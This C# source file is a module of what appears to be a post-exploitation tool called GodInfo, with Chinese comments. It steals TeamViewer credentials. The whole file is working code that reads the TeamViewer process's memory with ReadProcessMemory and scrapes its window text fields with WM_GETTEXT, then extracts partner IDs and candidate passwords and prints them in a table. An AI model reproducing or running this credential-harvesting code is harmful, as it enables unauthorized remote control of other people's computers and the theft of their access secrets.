using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.IO;
using GodInfo.Utils;

namespace GodInfo.Commands
{
    public class TeamViewerCredCommand : ICommand
    {
        #region Win32 API

        // 内存访问相关API
        const int PROCESS_VM_READ = 0x0010;
        const int PROCESS_QUERY_INFORMATION = 0x0400;

        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_READWRITE = 0x04;

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        // UI元素访问相关API
        enum GetWindowCmd : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }
        
        public static int WM_GETTEXT = 0x000D;

        [DllImport("user32.dll")]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetWindow(IntPtr hWnd, GetWindowCmd uCmd);
        
        [DllImport("user32.dll", EntryPoint = "GetClassName")]
        static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
        
        [DllImport("User32.dll", EntryPoint = "SendMessage")]
        static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, StringBuilder lParam);
        
        [DllImport("User32.dll")]
        static extern IntPtr FindWindowEx(IntPtr parent, IntPtr childe, string strclass, string FrmText);

        #endregion

        // TeamViewer界面中常见的非密码文本
        private static readonly HashSet<string> NonPasswordTexts = new HashSet<string>
        {
            "输入伙伴ID",
            "Partner ID",
            "搜索", 
            "Search",
            "TeamViewer",
            "远程控制",
            "Remote Control",
            "会议",
            "Meeting",
            "计算机",
            "Computer",
            "联系人",
            "Contacts",
            "设置",
            "Settings",
            "帮助",
            "Help",
            "文件传输",
            "File Transfer",
            "取消",
            "Cancel",
            "连接",
            "Connect",
            "控制",
            "Control",
            "密码",
            "Password",
            "ID",
            "伙伴ID",
            "用户名",
            "Username",
            "开始",
            "Start",
            "登录",
            "Login",
            "注册",
            "Register"
        };

        public struct TeamViewerCredential
        {
            public string ID;
            public string PossiblePasswords;
            public string MemoryAddress;
            public string Source; // 添加数据来源字段，区分不同提取方式
        }

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Credentials Mode", 1);
            Logger.WriteLine("[*] Hunting for TeamViewer credentials");
            
            // 统一凭据列表，用于合并两种方法获取的结果
            List<TeamViewerCredential> allCredentials = new List<TeamViewerCredential>();
            
            // 内存扫描方法获取凭据
            var memoryCredentials = ExtractTeamViewerCredentialsFromMemory();
            if (memoryCredentials.Count > 0)
            {
                allCredentials.AddRange(memoryCredentials);
            }
            
            // UI界面方法获取凭据
            var uiCredentials = ExtractTeamViewerCredentialsFromUI();
            if (uiCredentials.Count > 0)
            {
                allCredentials.AddRange(uiCredentials);
            }
            
            // 输出合并后的凭据
            if (allCredentials.Count > 0)
            {
                Logger.WriteLine($"\n[+] Total TeamViewer credentials found: {allCredentials.Count}");
                Logger.WriteLine("\n[+] TeamViewer credentials summary:");
                Logger.PrintTableFromStructs(allCredentials);
            }
            else
            {
                Logger.WriteLine("[-] No TeamViewer credentials found.");
            }
        }

        private List<TeamViewerCredential> ExtractTeamViewerCredentialsFromMemory()
        {
            Logger.TaskHeader("TeamViewer Credentials (Memory Scan)", 2);
            List<TeamViewerCredential> credentials = new List<TeamViewerCredential>();

            // 自动检测TeamViewer的PID
            int pid = GetPidForProcess("TeamViewer");

            if (pid == -1)
            {
                Logger.WriteLine("[-] No TeamViewer process found for memory scanning!");
                return credentials;
            }

            Logger.WriteLine($"[+] Found TeamViewer process with PID: {pid}");

            string executablePath = GetExecutablePath(pid);
            if (string.IsNullOrEmpty(executablePath))
            {
                Logger.WriteLine("[-] Failed to get process path!");
                return credentials;
            }
            Logger.WriteLine($"[+] Target executable path: {executablePath}");
            
            // 获取TeamViewer版本信息
            string versionInfo = GetTeamViewerVersion(executablePath);
            Logger.WriteLine($"[+] TeamViewer version: {versionInfo}");
            
            IntPtr processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
            if (processHandle == IntPtr.Zero)
            {
                Logger.WriteLine("[-] Failed to open process.");
                return credentials;
            }

            MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
            IntPtr address = IntPtr.Zero;
            HashSet<string> foundIDs = new HashSet<string>(); // 用于去重

            try
            {
                while (true)
                {
                    int result = VirtualQueryEx(processHandle, address, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
                    if (result == 0)
                        break;

                    if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_READWRITE)
                    {
                        uint regionSize = (uint)mbi.RegionSize.ToInt64();
                        if (regionSize > 0 && regionSize < 100 * 1024 * 1024) // 限制区域大小，避免过大的内存块
                        {
                            byte[] buffer = new byte[regionSize];
                            uint bytesRead;
                            if (ReadProcessMemory(processHandle, mbi.BaseAddress, buffer, regionSize, out bytesRead) && bytesRead > 0)
                            {
                                // 提取TeamViewer ID
                                var ids = ExtractTeamViewerIDs(buffer);
                                foreach (var id in ids)
                                {
                                    if (foundIDs.Contains(id))
                                        continue; // 跳过已发现的ID
                                    
                                    foundIDs.Add(id);
                                    
                                    // 找到ID在buffer中的索引位置
                                    string dataStr = Encoding.ASCII.GetString(buffer);
                                    int idIndex = dataStr.IndexOf(id);
                                    
                                    if (idIndex != -1)
                                    {
                                        TeamViewerCredential cred = new TeamViewerCredential();
                                        cred.ID = id;
                                        cred.MemoryAddress = $"0x{(mbi.BaseAddress.ToInt64() + idIndex).ToString("X")}";
                                        cred.Source = "Memory Scan";
                                        
                                        // 提取ID前40字节的连续字母数字字符串(4位以上)
                                        int beforeStart = Math.Max(0, idIndex - 40);
                                        List<string> beforeSegments = ExtractContinuousAlphanumeric(buffer, beforeStart, 40);
                                        
                                        // 将密码列表转换为逗号分隔的字符串
                                        string passwordsDisplay = beforeSegments.Count > 0 ? 
                                            string.Join(", ", beforeSegments) : "No candidates found";
                                        cred.PossiblePasswords = passwordsDisplay;
                                        
                                        credentials.Add(cred);
                                        
                                        Logger.WriteLine($"[+] Found TeamViewer ID: {id} (Memory Scan)");
                                        Logger.WriteLine($"    Memory address: {cred.MemoryAddress}");
                                        Logger.WriteLine($"    Possible passwords: {passwordsDisplay}");
                                        Logger.WriteLine("    -------------------");
                                    }
                                }
                            }
                        }
                    }

                    // 移动到下一个内存区域
                    address = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                    if (address.ToInt64() <= mbi.BaseAddress.ToInt64())
                        break; // 防止溢出
                }
                
                if (foundIDs.Count == 0)
                {
                    Logger.WriteLine("[-] No TeamViewer IDs found in memory.");
                }
                else
                {
                    Logger.WriteLine($"[+] Found {foundIDs.Count} unique TeamViewer IDs via memory scanning.");
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error processing TeamViewer memory: {ex.Message}");
            }
            finally
            {
                CloseHandle(processHandle);
            }
            
            return credentials;
        }
        
        private List<TeamViewerCredential> ExtractTeamViewerCredentialsFromUI()
        {
            Logger.TaskHeader("TeamViewer Credentials (UI Interface)", 2);
            List<TeamViewerCredential> credentials = new List<TeamViewerCredential>();
            
            // 查找TeamViewer主窗口
            IntPtr hwnd = FindWindow(null, "TeamViewer");
            if (hwnd == IntPtr.Zero)
            {
                Logger.WriteLine("[-] TeamViewer window not found for UI extraction!");
                return credentials;
            }
            
            Logger.WriteLine("[+] Found TeamViewer window for UI extraction");
            
            // 存储获取到的文本内容
            List<string> extractedTexts = new List<string>();
            
            // 遍历窗口子控件
            try
            {
                GetWindowControls(hwnd, extractedTexts);
                
                if (extractedTexts.Count == 0)
                {
                    Logger.WriteLine("[-] No text found in TeamViewer UI.");
                    return credentials;
                }
                
                // 记录所有提取到的文本，用于调试
                Logger.WriteLine("[*] All texts found in TeamViewer UI:");
                foreach (string text in extractedTexts)
                {
                    Logger.WriteLine($"    - \"{text}\"");
                }
                
                // 处理提取到的文本
                string teamViewerId = null;
                List<string> possiblePasswords = new List<string>();
                
                foreach (string text in extractedTexts)
                {
                    // 尝试匹配TeamViewer ID模式 (如: 123 456 789)
                    Match idMatch = Regex.Match(text, @"\d{3}\s\d{3}\s\d{3}");
                    if (idMatch.Success)
                    {
                        teamViewerId = idMatch.Value;
                        continue;
                    }
                    
                    // 检查是否是可能的密码
                    if (IsPossiblePassword(text))
                    {
                        possiblePasswords.Add(text);
                    }
                }
                
                // 如果找到了ID和可能的密码，则添加到凭据列表
                if (!string.IsNullOrEmpty(teamViewerId))
                {
                    TeamViewerCredential cred = new TeamViewerCredential();
                    cred.ID = teamViewerId;
                    cred.PossiblePasswords = possiblePasswords.Count > 0 ? 
                        string.Join(", ", possiblePasswords) : "No password found";
                    cred.MemoryAddress = "N/A";
                    cred.Source = "UI Interface";
                    
                    credentials.Add(cred);
                    
                    Logger.WriteLine($"[+] Found TeamViewer ID: {teamViewerId} (UI Interface)");
                    Logger.WriteLine($"    Possible passwords: {cred.PossiblePasswords}");
                    Logger.WriteLine("    -------------------");
                }
                else
                {
                    Logger.WriteLine("[-] No valid TeamViewer ID found in UI.");
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error extracting TeamViewer UI data: {ex.Message}");
            }
            
            return credentials;
        }
        
        // 获取TeamViewer版本信息
        private string GetTeamViewerVersion(string executablePath)
        {
            try
            {
                if (!File.Exists(executablePath))
                    return "Unknown version (file not found)";
                    
                FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(executablePath);
                string fileVersion = versionInfo.FileVersion;
                string productVersion = versionInfo.ProductVersion;
                
                // 返回文件版本或产品版本
                if (!string.IsNullOrEmpty(fileVersion))
                    return fileVersion;
                else if (!string.IsNullOrEmpty(productVersion))
                    return productVersion;
                else
                    return "Version found, but no version number available";
            }
            catch (Exception ex)
            {
                return $"Unknown version (error: {ex.Message})";
            }
        }
        
        // 判断文本是否可能是密码
        private bool IsPossiblePassword(string text)
        {
            // 如果文本为空或空白，不可能是密码
            if (string.IsNullOrWhiteSpace(text))
                return false;
                
            // 如果文本太长或太短，不太可能是密码
            if (text.Length < 4 || text.Length > 12)
                return false;
                
            // 如果包含空格，不太可能是密码
            if (text.Contains(" "))
                return false;
                
            // 如果是ID格式，不是密码
            if (Regex.IsMatch(text, @"\d{3}\s\d{3}\s\d{3}"))
                return false;
                
            // 如果是常见的UI文本，不是密码
            if (NonPasswordTexts.Contains(text))
                return false;
                
            // 中文密码不太常见
            if (Regex.IsMatch(text, @"[\u4e00-\u9fa5]"))
                return false;
                
            // 如果全是数字且长度是9-10位，可能是ID的无空格版本
            if (Regex.IsMatch(text, @"^\d{9,10}$"))
                return false;
                
            return true;
        }
        
        private void GetWindowControls(IntPtr parentHwnd, List<string> texts)
        {
            // 获取第一个子窗口
            IntPtr childHwnd = GetWindow(parentHwnd, GetWindowCmd.GW_CHILD);
            
            // 遍历所有子窗口
            while (childHwnd != IntPtr.Zero)
            {
                // 获取子窗口的类名
                StringBuilder className = new StringBuilder(256);
                GetClassName(childHwnd, className, className.Capacity);
                
                // 只检查Edit控件，不包括Static控件
                if (className.ToString() == "Edit")
                {
                    // 获取控件中的文本
                    StringBuilder text = new StringBuilder(1024);
                    SendMessage(childHwnd, WM_GETTEXT, text.Capacity, text);
                    
                    // 如果文本不为空，添加到列表
                    if (!string.IsNullOrWhiteSpace(text.ToString()))
                    {
                        texts.Add(text.ToString());
                    }
                }
                
                // 递归处理子窗口的子窗口
                GetWindowControls(childHwnd, texts);
                
                // 获取下一个同级窗口
                childHwnd = GetWindow(childHwnd, GetWindowCmd.GW_HWNDNEXT);
            }
        }

        private List<string> ExtractTeamViewerIDs(byte[] data)
        {
            // 使用正则表达式寻找形如"123 456 789"的ID格式
            string dataStr = Encoding.ASCII.GetString(data);
            List<string> results = new List<string>();
            
            // 匹配形如"489 596 834"的九位纯数字ID（中间有空格分隔）
            Regex idPattern = new Regex(@"\d{3}\s\d{3}\s\d{3}");
            
            foreach (Match match in idPattern.Matches(dataStr))
            {
                results.Add(match.Value);
            }
            
            return results;
        }

        private List<string> ExtractContinuousAlphanumeric(byte[] data, int startIndex, int length, int minLength = 4)
        {
            // 先提取指定范围内的所有ASCII字符
            StringBuilder fullText = new StringBuilder();
            for (int i = 0; i < length; i++)
            {
                if (startIndex + i >= data.Length)
                    break;
                    
                byte b = data[startIndex + i];
                if ((b >= 48 && b <= 57) ||    // 0-9
                    (b >= 65 && b <= 90) ||    // A-Z
                    (b >= 97 && b <= 122))     // a-z
                {
                    fullText.Append((char)b);
                }
                else
                {
                    fullText.Append(' '); // 用空格替代非字母数字字符，便于分割
                }
            }
            
            // 分割并过滤出连续的字母数字字符串
            string[] segments = fullText.ToString().Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
            List<string> continuousSegments = new List<string>();
            
            foreach (string segment in segments)
            {
                if (segment.Length >= minLength)
                {
                    continuousSegments.Add(segment);
                }
            }
            
            return continuousSegments;
        }

        private int GetPidForProcess(string processName)
        {
            var processList = Process.GetProcessesByName(processName);
            foreach (var process in processList)
            {
                // 排除Services类型的进程
                if (process.SessionId != 0)
                {
                    return process.Id;
                }
            }
            return -1;
        }

        private string GetExecutablePath(int pid)
        {
            try
            {
                Process process = Process.GetProcessById(pid);
                return process.MainModule.FileName;
            }
            catch
            {
                return null;
            }
        }
    }
} 